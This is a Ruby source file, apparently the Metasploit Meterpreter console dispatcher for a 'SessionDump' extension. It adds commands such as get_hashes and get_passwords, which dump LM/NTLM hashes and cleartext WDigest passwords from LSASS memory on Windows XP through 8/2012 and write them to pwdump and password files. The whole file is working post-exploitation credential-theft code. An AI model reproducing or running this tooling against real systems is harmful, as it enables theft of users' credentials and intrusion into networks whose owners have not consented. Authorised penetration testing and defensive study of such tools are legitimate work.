require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# This meterpreter extension can be used to dump hashes and passwords from memory
# Compatible with x86 and x64 systems from Windows XP/2003 to Windows 8/2012
# Author : Steeve Barbeau (steeve DOT barbeau AT hsc DOT fr)
# http://www.hsc.fr/ressources/outils/sessiondump/index.html.en
#
###

ERROR_SESSIONDUMP_PROCESS = 1
ERROR_SESSIONDUMP_GET_DATA_IN_MEMORY = 2
ERROR_SESSIONDUMP_GET_HASHES = 3
ERROR_SESSIONDUMP_GET_WDIGEST_PASSWORDS = 4


class Console::CommandDispatcher::SessionDump

	Klass = Console::CommandDispatcher::SessionDump

	include Console::CommandDispatcher

	#
	# Initializes an instance of the SessionDump command interaction.
	#
	def initialize(shell)
		super

		@lsasrv = Hash.new
		@lsasrv['version'] = nil
		@lsasrv['offsets'] = nil
		@lsasrv['file'] = "sessiondump_lsasrv_offsets.csv"

		@wdigest = Hash.new
		@wdigest['version'] = nil
		@wdigest['offsets'] = nil
		@wdigest['file'] = "sessiondump_wdigest_offsets.csv"

		@dlls = Hash.new
		@dlls['lsasrv.dll'] = @lsasrv
		@dlls['wdigest.dll'] = @wdigest

		@errors = {ERROR_SESSIONDUMP_PROCESS => "Fail to open Lsass process. Check your rights !",
					ERROR_SESSIONDUMP_GET_DATA_IN_MEMORY => "Fail to get information in memory. It can be a problem of offsets",
					ERROR_SESSIONDUMP_GET_HASHES => "Fail to get hashes",
					ERROR_SESSIONDUMP_GET_WDIGEST_PASSWORDS => "Fail to get Wdigest passwords"}
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"set_lsasrv_offsets_file" => "Specify which file to use to look for Lsasrv offsets (by default use $MSF/msf3/data/sessiondump_lsasrv_offsets.csv)",
			"set_wdigest_offsets_file" => "Specify which file to use to look for Wdigest offsets (by default use $MSF/msf3/data/sessiondump_wdigest_offsets.csv)",
			"get_hashes" => "Dump LM hash and NTLM hash. `get_hashes output_file` will copy hashes in a file",
			"get_passwords" => "Dump clear text passwords from Wdigest.dll",
			"get_lsasrv_version" => "Get Lsasrv DLL version",
			"get_wdigest_version" => "Get Wdigest DLL version",
		}
	end

	@@get_hashes_opts = Rex::Parser::Arguments.new(
		'-i' => [true, "Specify offsets to use. Format : encryptmemory,list_addr,list_count,feedback,deskey,3deskey,iv"],
		'-o' => [true, "Write output in .pwdump, .lm, .ntlm files. Default name: `sessiondump.{pwdump,lm,ntlm}`"]
	)

	@@get_passwords_opts = Rex::Parser::Arguments.new(
		'-i' => [true, "Specify offsets to use. Format : encryptmemory,list_addr,list_count,feedback,deskey,3deskey,iv,wdigest_list"],
		'-o' => [true, "Write output in a .pwd file. Default name: `sessiondump.pwd`"]
	)

	def cmd_set_lsasrv_offsets_file(*args)
		if args.empty?
			print_error "Argument is mandatory"
			return false
		elsif not ::File.file?(args[0])
			print_error "#{args[0]} is not a regular file"
			return false
		end

		set_dll_offsets('lsasrv.dll', args[0])
		if not @dlls['lsasrv.dll']['offsets'].nil?
			print_status "Symbols addresses are loaded"
			return true
		end
	end

	def cmd_set_lsasrv_offsets_file_tabs(str, words)
		tab_complete_filenames(str, words)
	end

	def cmd_set_wdigest_offsets_file(*args)
		if args.empty?
			print_error "Argument is mandatory"
			return false
		elsif not ::File.file?(args[0])
			print_error "#{args[0]} is not a regular file"
			return false
		end

		set_dll_offsets('wdigest.dll', args[0])
		if not @dlls['wdigest.dll']['offsets'].nil?
			print_status "Symbols addresses are loaded"
			return true
		end
	end

	def cmd_set_wdigest_offsets_file_tabs(str, words)
		tab_complete_filenames(str, words)
	end

	def cmd_get_passwords_help
		print_line "Usage: get_passwords [options]"
		print_line
		print_line "Extract passwords from memory"
		print_line @@get_passwords_opts.usage
	end

	def cmd_get_passwords(*args)
		pwd_file = nil
		inline_offsets = false

		@@get_passwords_opts.parse(args) { |opt, idx, val|
			case opt
			when "-o"
				# Export password in file
				if val.nil?
					val = 'sessiondump'
				end
				pwd_file = ::File.new("#{val}.pwd", 'a+')
			when "-i"
				if not val.nil?
					load_inline_offsets('lsasrv.dll', val)
					load_inline_offsets('wdigest.dll', val)
					inline_offsets = true
				end
			end
		}

		if (@dlls['wdigest.dll']['offsets'].nil? or @dlls['lsasrv.dll']['offsets'].nil?) and not inline_offsets
			# Init DLL offsets thanks to CSV files
			init_offset
		end

		if not @dlls['wdigest.dll']['offsets'].nil? and not @dlls['lsasrv.dll']['offsets'].nil?
			all_offsets = @dlls['wdigest.dll']['offsets'].merge(@dlls['lsasrv.dll']['offsets'])

			sessions = client.sessiondump.get_wdigest_passwords(all_offsets)
			if not pwd_file.nil?
				print_status "Exporting to file ..."
			end
			sessions.each do |s|
				if s.key?('error')
					print_error "#{@errors[s['error']]}"
				else
					if s['pwd'].size() == 0
						output = "#{s['domain']}\\#{s['user']} : <PASSWORD_EMPTY>"
					else
						output = "#{s['domain']}\\#{s['user']} : #{s['pwd']}"
					end
					print_line output
					if not pwd_file.nil?
						pwd_file.write("#{output}\n")
					end
				end
			end
			if not pwd_file.nil?
				pwd_file.close()
			end
			return true
		end
		return false
	end

	def cmd_get_hashes_help
		print_line "Usage: get_hashes [options]"
		print_line
		print_line "Extract LM and NTLM hashes from memory"
		print_line @@get_hashes_opts.usage
	end

	def cmd_get_hashes(*args)
		pwdump_file, lm_file, ntlm_file = nil
		inline_offsets = false

		@@get_hashes_opts.parse(args) { |opt, idx, val|
			case opt
			when "-o"
				# Export hashes in file
				if val.nil?
					val = 'sessiondump'
				end
				pwdump_file = ::File.new("#{val}.pwdump", 'a+')
				lm_file = ::File.new("#{val}.lm", 'a+')
				ntlm_file = ::File.new("#{val}.ntlm", 'a+')
			when "-i"
				if not val.nil?
					load_inline_offsets('lsasrv.dll', val)
					inline_offsets = true
				end
			end
		}

		if @dlls['lsasrv.dll']['offsets'].nil? and not inline_offsets
			# Init DLL offsets thanks to CSV files
			init_offset
		end

		if not @dlls['lsasrv.dll']['offsets'].nil?
			sessions = client.sessiondump.get_hashes(@dlls['lsasrv.dll']['offsets'])
			if not pwdump_file.nil? and not lm_file.nil? and not ntlm_file.nil?
				print_status "Exporting to file ..."
			end
			sessions.each do |s|
				if s.key?('error')
					print_error "#{@errors[s['error']]}"
				else
					output = "#{s['domain']}\\#{s['user']}::#{s['lm']}:#{s['ntlm']}:::"
					print_line output
					if not pwdump_file.nil? and not lm_file.nil? and not ntlm_file.nil?
						pwdump_file.write("#{output}\n")
						lm_file.write("#{s['lm']}\n")
						ntlm_file.write("#{s['ntlm']}\n")
					end
				end
			end
			if not pwdump_file.nil? and not lm_file.nil? and not ntlm_file.nil?
				pwdump_file.close()
				lm_file.close()
				ntlm_file.close()
			end
			return true
		end
		return false
	end

	def cmd_get_lsasrv_version()
		print_line client.sessiondump.get_dll_version('lsasrv.dll')
		return true
	end

	def cmd_get_wdigest_version()
		print_line client.sessiondump.get_dll_version('wdigest.dll')
		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"SessionDump"
	end

	protected

	def set_dll_offsets(dll_name, offset_file)
		# Get DLL version
		@dlls[dll_name]['version'] = client.sessiondump.get_dll_version(dll_name)

		# Get symbols addresses relating to DLL version
		@dlls[dll_name]['offsets'] = client.sessiondump.get_symbols_addresses(offset_file, @dlls[dll_name]['version'], dll_name)

		if @dlls[dll_name]['offsets'].nil?
			print_error "#{dll_name} version #{@dlls[dll_name]['version']} (#{client.sys.config.sysinfo['Architecture']}) is not in your CSV file"
			return false
		end
	end

	def load_inline_offsets(dll_name, inline_data)
		#@dlls[dll_name]['offsets'] = client.sessiondump.read_csv_input(dll_name, inline_data)
		tmp = client.sessiondump.read_csv_input(dll_name, inline_data)
		if not tmp.nil?
			@dlls[dll_name]['offsets'] = tmp
		else
			print_error "Failed to import input offsets. Check input parameters!"
		end
	end

	def init_offset
		wdigest_offsets_file = ::File.join(Msf::Config.data_directory, @dlls['wdigest.dll']['file'])
		lsasrv_offsets_file = ::File.join(Msf::Config.data_directory, @dlls['lsasrv.dll']['file'])

		dlls_offsets = Hash.new
		dlls_offsets['lsasrv.dll'] = lsasrv_offsets_file
		dlls_offsets['wdigest.dll'] = wdigest_offsets_file

		dlls_offsets.each do |k,v|
			if ::File.file?(v)
				set_dll_offsets(k, v)
			else
				print_error "Symbols offsets file (#{v}) not found. Please run the appropriate `set_[lsasrv|wdigest]_offsets_file` command before."
			end
		end
	end

end

end
end
end
end
